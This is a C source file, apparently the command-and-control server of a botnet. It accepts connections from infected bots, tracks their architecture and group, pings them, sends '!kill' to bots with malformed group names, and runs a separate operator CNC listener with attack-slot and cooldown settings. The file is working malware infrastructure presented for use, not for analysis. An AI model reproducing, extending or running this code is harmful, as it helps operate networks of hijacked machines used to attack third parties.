// language: C, file: botnet.c, target: Linux, gcc
#include "headers/botnet.h"
#include "headers/user_handler.h"
#include "headers/logger.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdbool.h>
#include <netinet/tcp.h>
#include <errno.h>
#include <sys/time.h>
#include <time.h>
#include <pthread.h>
#include <sys/epoll.h>
#include <poll.h>
#include <netdb.h>

Bot  bots[MAX_BOTS];
int  bot_count       = 0;
int  global_cooldown = 0;
int  g_maxslots      = 5;    /* default: 5 slots — change with "maxslots N" in CNC */
time_t g_start_time  = 0;
pthread_mutex_t bot_mutex         = PTHREAD_MUTEX_INITIALIZER;
pthread_mutex_t cooldown_mutex    = PTHREAD_MUTEX_INITIALIZER;
pthread_mutex_t g_maxslots_mutex  = PTHREAD_MUTEX_INITIALIZER;

/* ── O(1) fd → bot-array-index map ─────────────────────────────────────
 * _fdmap[fd] = 0        → slot empty
 * _fdmap[fd] = idx + 1  → bot at bots[idx] owns this fd
 * All access is under bot_mutex.
 * ──────────────────────────────────────────────────────────────────── */
static int _fdmap[FD_HARD_LIMIT];   /* zero-initialised by BSS */

void fdmap_set(int fd, int idx) {
    if (fd >= 0 && fd < FD_HARD_LIMIT) _fdmap[fd] = idx + 1;
}
void fdmap_clear(int fd) {
    if (fd >= 0 && fd < FD_HARD_LIMIT) _fdmap[fd] = 0;
}
int fdmap_get(int fd) {
    if (fd < 0 || fd >= FD_HARD_LIMIT) return -1;
    int v = _fdmap[fd];
    return (v > 0) ? (v - 1) : -1;
}

void cleanup_socket(int* socket) {
    if (socket && *socket > 0) {
        int fd = *socket;
        *socket = -1;

        shutdown(fd, SHUT_RDWR);

        if (close(fd) == -1) {
            if (errno != EBADF && errno != EINTR) {
                perror("close");
            }
        }
    }
}

/* Thread-safe send for a single bot. Holds send_lock so ping_bots and the
   epoll loop never interleave frames on the same fd. */
void bot_send(int idx, const void* buf, size_t len) {
    if (idx < 0 || idx >= bot_count) return;
    pthread_mutex_lock(&bots[idx].send_lock);
    int fd = bots[idx].socket;
    if (fd > 0) {
        ssize_t r = send(fd, buf, len, MSG_NOSIGNAL | MSG_DONTWAIT);
        if (r < 0 && errno != EAGAIN && errno != EWOULDBLOCK && errno != EINTR) {
            bots[idx].is_valid = 0;
        }
    }
    pthread_mutex_unlock(&bots[idx].send_lock);
}

/* Full teardown of a bot slot. Caller must NOT hold bot_mutex. */
void bot_teardown(int idx, const char* cause) {
    int fd = -1;
    char ipbuf[32] = {0};
    char arch[20] = {0};

    pthread_mutex_lock(&bot_mutex);
    if (idx >= 0 && idx < bot_count) {
        fd = bots[idx].socket;
        bots[idx].socket   = -1;
        bots[idx].is_valid = 0;
        if (fd > 0) fdmap_clear(fd);   /* O(1) map entry gone before unlock */
        inet_ntop(AF_INET, &bots[idx].address.sin_addr, ipbuf, sizeof(ipbuf));
        strncpy(arch, bots[idx].arch, sizeof(arch) - 1);
    }
    pthread_mutex_unlock(&bot_mutex);

    if (fd > 0) {
        log_bot_disconnected(ipbuf, arch, cause);
        cleanup_socket(&fd);
    }
}

/* O(1) fd → bot-index lookup via fdmap.
   Old implementation was O(n) — called on every recv + every ping tick. */
static int find_bot_by_fd(int fd) {
    pthread_mutex_lock(&bot_mutex);
    int idx = fdmap_get(fd);
    /* Validate: make sure the slot actually owns this fd (guard against stale entries). */
    if (idx >= 0 && (idx >= bot_count || bots[idx].socket != fd)) idx = -1;
    pthread_mutex_unlock(&bot_mutex);
    return idx;
}

static void sweep_invalid_bots(void) {
    /* Caller must hold bot_mutex.
     *
     * Swap-with-last to avoid O(n) shift (which would copy every embedded
     * pthread_mutex_t — UB if any are held by bot_send).
     *
     * After the swap we MUST update the fdmap: the last bot's fd now maps
     * to slot i, not bot_count.  Without this, find_bot_by_fd would return
     * the wrong index for that bot after the next sweep.
     */
    int i = 0;
    while (i < bot_count) {
        if (!bots[i].is_valid || bots[i].socket <= 0) {
            int fd = bots[i].socket;
            if (fd > 0) {
                fdmap_clear(fd);        /* remove stale entry */
                shutdown(fd, SHUT_RDWR);
                close(fd);
            }
            pthread_mutex_destroy(&bots[i].send_lock);

            bot_count--;
            if (i < bot_count) {
                /* Remap last bot's fd → new index before the struct copy */
                if (bots[bot_count].socket > 0)
                    fdmap_set(bots[bot_count].socket, i);
                bots[i] = bots[bot_count];  /* one copy: last slot's mutex moves */
            }
            continue;   /* recheck slot i */
        }
        i++;
    }
}

static void set_nonblocking(int fd) {
    int flags = fcntl(fd, F_GETFL, 0);
    if (flags >= 0) fcntl(fd, F_SETFL, flags | O_NONBLOCK);
}

static void tune_socket(int fd) {
    int optval = 1;
    setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &optval, sizeof(optval));
    setsockopt(fd, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval));

    /* Kernel-side dead-peer detection fires inside our 90s window:
       ~30s idle + 4 probes * 5s = ~50s to detect a truly dead peer. */
    int ka_idle  = 30;
    int ka_intvl = 5;
    int ka_cnt   = 4;
    setsockopt(fd, IPPROTO_TCP, TCP_KEEPIDLE,  &ka_idle,  sizeof(ka_idle));
    setsockopt(fd, IPPROTO_TCP, TCP_KEEPINTVL, &ka_intvl, sizeof(ka_intvl));
    setsockopt(fd, IPPROTO_TCP, TCP_KEEPCNT,   &ka_cnt,   sizeof(ka_cnt));
}

/* handle_accept() removed — the bot_listener epoll loop handles accepts inline.
   Having two separate paths caused drift and the function was never called. */

static void handle_bot_readable(int epoll_fd, uint32_t events, int bot_fd) {
    /* EPOLLRDHUP allein ist KEIN Grund zum Teardown. Nur echte Fehler. */
    if (events & (EPOLLHUP | EPOLLERR)) {
        int idx = find_bot_by_fd(bot_fd);
        if (idx >= 0) bot_teardown(idx, (events & EPOLLERR) ? "epollerr" : "epollhup");
        epoll_ctl(epoll_fd, EPOLL_CTL_DEL, bot_fd, NULL);
        return;
    }

    char buffer[MAX_COMMAND_LENGTH] = {0};
    ssize_t len = recv(bot_fd, buffer, sizeof(buffer) - 1, 0);

    if (len < 0) {
        if (errno == EAGAIN || errno == EWOULDBLOCK || errno == EINTR) return;
        int idx = find_bot_by_fd(bot_fd);
        if (idx >= 0) {
            char cause[64];
            snprintf(cause, sizeof(cause), "recv errno=%d (%s)", errno, strerror(errno));
            bot_teardown(idx, cause);
        }
        epoll_ctl(epoll_fd, EPOLL_CTL_DEL, bot_fd, NULL);
        return;
    }

    if (len == 0) {
        int idx = find_bot_by_fd(bot_fd);
        if (idx >= 0) bot_teardown(idx, "EOF");
        epoll_ctl(epoll_fd, EPOLL_CTL_DEL, bot_fd, NULL);
        return;
    }

    /* Mark last_seen under the index lock. */
    int idx = -1;
    pthread_mutex_lock(&bot_mutex);
    for (int i = 0; i < bot_count; i++) {
        if (bots[i].socket == bot_fd) { idx = i; bots[i].last_seen = time(NULL); break; }
    }
    pthread_mutex_unlock(&bot_mutex);

    if (idx < 0) {
        epoll_ctl(epoll_fd, EPOLL_CTL_DEL, bot_fd, NULL);
        close(bot_fd);
        return;
    }

    buffer[len] = 0;

    if (strncmp(buffer, "ping", 4) == 0) {
        char pong[64];
        snprintf(pong, sizeof(pong), "pong %s", bots[idx].arch);
        bot_send(idx, pong, strlen(pong));
        return;
    }
    if (strncmp(buffer, "pong", 4) == 0) {
        return;
    }

    int valid = 1;
    for (ssize_t i = 0; i < len; i++) {
        unsigned char c = (unsigned char)buffer[i];
        if (c < 0x09 || (c > 0x0D && c < 0x20) || c > 0x7E) { valid = 0; break; }
    }
if (!valid) {
    int i2 = find_bot_by_fd(bot_fd);
    if (i2 >= 0) bot_teardown(i2, "invalid frame");
    epoll_ctl(epoll_fd, EPOLL_CTL_DEL, bot_fd, NULL);
}
}

void* bot_listener(void* arg) {
    int botport = *((int*)arg);
    int bot_server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (bot_server_socket < 0) {
        perror("Failed to create bot server socket");
        return NULL;
    }

    int optval = 1;
    if (setsockopt(bot_server_socket, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval)) < 0 ||
        setsockopt(bot_server_socket, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0 ||
        setsockopt(bot_server_socket, IPPROTO_TCP, TCP_NODELAY, &optval, sizeof(optval)) < 0) {
        perror("Failed to set socket options");
        close(bot_server_socket);
        return NULL;
    }
    /* Larger kernel socket buffers — default 4KB is a bottleneck at scale.
       OS may cap at /proc/sys/net/core/rmem_max; run:
         sysctl -w net.core.rmem_max=16777216 net.core.wmem_max=16777216 */
    int rbuf = 4 * 1024 * 1024;   /* 4 MB recv buffer */
    int wbuf = 4 * 1024 * 1024;   /* 4 MB send buffer */
    setsockopt(bot_server_socket, SOL_SOCKET, SO_RCVBUF, &rbuf, sizeof(rbuf));
    setsockopt(bot_server_socket, SOL_SOCKET, SO_SNDBUF, &wbuf, sizeof(wbuf));

    struct sockaddr_in bot_server_addr;
    memset(&bot_server_addr, 0, sizeof(bot_server_addr));
    bot_server_addr.sin_family = AF_INET;
    bot_server_addr.sin_addr.s_addr = INADDR_ANY;
    bot_server_addr.sin_port = htons(botport);

    int bind_attempts = 3;
    while (bind_attempts--) {
        if (bind(bot_server_socket, (struct sockaddr*)&bot_server_addr, sizeof(bot_server_addr)) == 0) break;
        if (bind_attempts > 0) {
            perror("Bind failed, retrying");
            sleep(1);
            continue;
        }
        perror("Failed to bind bot server socket");
        close(bot_server_socket);
        return NULL;
    }

    set_nonblocking(bot_server_socket);

    /* 4096-deep backlog — SOMAXCONN is usually 128, drops connections under flood.
       Kernel respects this up to /proc/sys/net/core/somaxconn; set it to 4096 too:
         sysctl -w net.core.somaxconn=4096 net.ipv4.tcp_max_syn_backlog=4096 */
    if (listen(bot_server_socket, 4096) < 0) {
        perror("Failed to listen on bot server socket");
        close(bot_server_socket);
        return NULL;
    }

    int epoll_fd = epoll_create1(0);
    if (epoll_fd == -1) {
        perror("epoll_create1 failed");
        close(bot_server_socket);
        return NULL;
    }

    struct epoll_event ev, events[1024];
    ev.events = EPOLLIN;
    ev.data.fd = bot_server_socket;
    if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, bot_server_socket, &ev) == -1) {
        perror("epoll_ctl ADD server");
        close(epoll_fd);
        close(bot_server_socket);
        return NULL;
    }

    while (1) {
        int nfds = epoll_wait(epoll_fd, events, 1024, 1000);
        if (nfds < 0) {
            if (errno == EINTR) continue;
            break;
        }

        for (int n = 0; n < nfds; n++) {
            if (events[n].data.fd == bot_server_socket) {
                /* Drain the accept queue — more than one connect can land per wakeup. */
                while (1) {
                    struct sockaddr_in peek;
                    socklen_t plen = sizeof(peek);
                    int peekfd = accept(bot_server_socket, (struct sockaddr*)&peek, &plen);
                    if (peekfd < 0) break;
                    set_nonblocking(peekfd);
                    tune_socket(peekfd);

                    /* Same as handle_accept: no IP-based duplicate removal.
                       Let EPOLLHUP/EOF clean up dead slots naturally. */

                    struct pollfd pfd = { .fd = peekfd, .events = POLLIN };
                    int pr = poll(&pfd, 1, ARCH_HANDSHAKE_TIMEOUT_MS);

                    char archbuf[64] = {0};
                    ssize_t archlen = 0;
                    if (pr > 0 && (pfd.revents & POLLIN)) {
                        archlen = recv(peekfd, archbuf, sizeof(archbuf) - 1, 0);
                    }
                    if (archlen <= 0) { close(peekfd); continue; }
                    archbuf[archlen] = 0;

                    char arch[32] = "unknown";
                    char group[64] = "default";
                    int bad_group = 0;

                    char *space = strchr(archbuf, ' ');
                    if (space) {
                        size_t alen = space - archbuf;
                        if (alen > 0 && alen < sizeof(arch)) {
                            memcpy(arch, archbuf, alen);
                            arch[alen] = 0;
                        }
                        while (*(++space) == ' ');
                        strncpy(group, space, sizeof(group) - 1);
                        group[sizeof(group) - 1] = 0;
                        if (strlen(group) > 16) bad_group = 1;
                        for (size_t gi = 0; group[gi] && !bad_group; gi++) {
                            char c = group[gi];
                            if (!((c >= '0' && c <= '9') ||
                                  (c >= 'A' && c <= 'Z') ||
                                  (c >= 'a' && c <= 'z'))) bad_group = 1;
                        }
                    } else {
                        strncpy(arch, archbuf, sizeof(arch) - 1);
                        arch[sizeof(arch) - 1] = 0;
                    }

                    if (bad_group) {
                        send(peekfd, "!kill", 5, MSG_NOSIGNAL);
                        close(peekfd);
                        continue;
                    }

                    pthread_mutex_lock(&bot_mutex);
                    if (bot_count >= MAX_BOTS) {
                        pthread_mutex_unlock(&bot_mutex);
                        close(peekfd);
                        continue;
                    }
                    int idx = bot_count;
                    bots[idx].socket = peekfd;
                    bots[idx].address = peek;
                    bots[idx].is_valid = 1;
                    bots[idx].last_seen = time(NULL);
                    strncpy(bots[idx].arch, arch, sizeof(bots[idx].arch) - 1);
                    bots[idx].arch[sizeof(bots[idx].arch) - 1] = 0;
                    strncpy(bots[idx].group, group, sizeof(bots[idx].group) - 1);
                    bots[idx].group[sizeof(bots[idx].group) - 1] = 0;
                    pthread_mutex_init(&bots[idx].send_lock, NULL);
                    fdmap_set(peekfd, idx);   /* O(1) map: fd → slot idx */

                    char ipbuf[32];
                    inet_ntop(AF_INET, &peek.sin_addr, ipbuf, sizeof(ipbuf));
                    log_bot_join(bots[idx].arch, ipbuf, bots[idx].group);
                    bot_count++;
                    pthread_mutex_unlock(&bot_mutex);

                    struct epoll_event bev;
                    bev.events = EPOLLIN | EPOLLRDHUP;
                    bev.data.fd = peekfd;
                    if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, peekfd, &bev) == -1) {
                        perror("epoll_ctl ADD bot");
                        int dead = find_bot_by_fd(peekfd);
                        if (dead >= 0) bot_teardown(dead, "epoll add failed");
                    }
                }
            } else {
                handle_bot_readable(epoll_fd, events[n].events, events[n].data.fd);
            }
        }

        /* Periodic sweep of anything marked invalid. */
        pthread_mutex_lock(&bot_mutex);
        sweep_invalid_bots();
        pthread_mutex_unlock(&bot_mutex);
    }

    close(epoll_fd);
    close(bot_server_socket);
    return NULL;
}

void scan_and_kill_bad_groups(void) {
    pthread_mutex_lock(&bot_mutex);
    for (int i = 0; i < bot_count; i++) {
        if (!bots[i].is_valid) continue;
        int bad_group = 0;
        if (strlen(bots[i].group) > 16) bad_group = 1;
        for (size_t gi = 0; bots[i].group[gi] && !bad_group; gi++) {
            char c = bots[i].group[gi];
            if (!((c >= '0' && c <= '9') ||
                  (c >= 'A' && c <= 'Z') ||
                  (c >= 'a' && c <= 'z'))) bad_group = 1;
        }
        if (bad_group) {
            send(bots[i].socket, "!kill", 5, MSG_NOSIGNAL);
            bots[i].is_valid = 0;
        }
    }
    sweep_invalid_bots();
    pthread_mutex_unlock(&bot_mutex);
}

void* ping_bots(void* arg) {
    int *snapshot = malloc(sizeof(int) * MAX_BOTS);
    if (!snapshot) return NULL;

    while (1) {
        sleep(PING_INTERVAL_SEC);
        time_t now = time(NULL);

        int n = 0;

        pthread_mutex_lock(&bot_mutex);
        for (int i = 0; i < bot_count; i++) {
            if (!bots[i].is_valid || bots[i].socket <= 0) continue;
            if (now - bots[i].last_seen > BOT_IDLE_TIMEOUT_SEC) {
                char ipbuf[32] = {0};
                inet_ntop(AF_INET, &bots[i].address.sin_addr, ipbuf, sizeof(ipbuf));
                log_bot_disconnected(ipbuf, bots[i].arch, "ping timeout");
                bots[i].is_valid = 0;
            } else {
                snapshot[n++] = bots[i].socket;
            }
        }
        sweep_invalid_bots();
        pthread_mutex_unlock(&bot_mutex);

        /* Send pings OUTSIDE the array lock, per-fd send_lock serializes. */
        for (int k = 0; k < n; k++) {
            int fd = snapshot[k];
            int idx = find_bot_by_fd(fd);
            if (idx >= 0) bot_send(idx, "ping", 4);
        }
    }

    free(snapshot);
    return NULL;
}

void* manage_cooldown(void* arg) {
    while (1) {
        pthread_mutex_lock(&cooldown_mutex);
        if (global_cooldown > 0) global_cooldown--;
        pthread_mutex_unlock(&cooldown_mutex);
        sleep(1);
    }
    return NULL;
}

void* cnc_listener(void* arg) {
    int cncport = *((int*)arg);
    int server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (server_socket < 0) {
        perror("Failed to create CNC server socket");
        return NULL;
    }

    int optval = 1;
    if (setsockopt(server_socket, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval)) < 0 ||
        setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0) {
        perror("Failed to set CNC socket options");
        close(server_socket);
        return NULL;
    }

    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(cncport);

    int bind_attempts = 3;
    while (bind_attempts--) {
        if (bind(server_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) == 0) break;
        if (bind_attempts > 0) {
            perror("CNC bind failed, retrying");
            sleep(1);
            continue;
        }
        perror("Failed to bind CNC server socket");
        close(server_socket);
        return NULL;
    }

    if (listen(server_socket, 256) < 0) {
        perror("Failed to listen on CNC server socket");
        close(server_socket);
        return NULL;
    }

    while (1) {
        struct sockaddr_in client_addr;
        socklen_t client_len = sizeof(client_addr);
        int *client_socket = malloc(sizeof(int));
        if (!client_socket) continue;
        *client_socket = accept(server_socket, (struct sockaddr*)&client_addr, &client_len);
        if (*client_socket < 0) {
            free(client_socket);
            continue;
        }
        pthread_t client_thread;
        pthread_create(&client_thread, NULL, handle_client, client_socket);
        pthread_detach(client_thread);
    }
    close(server_socket);
    return NULL;
}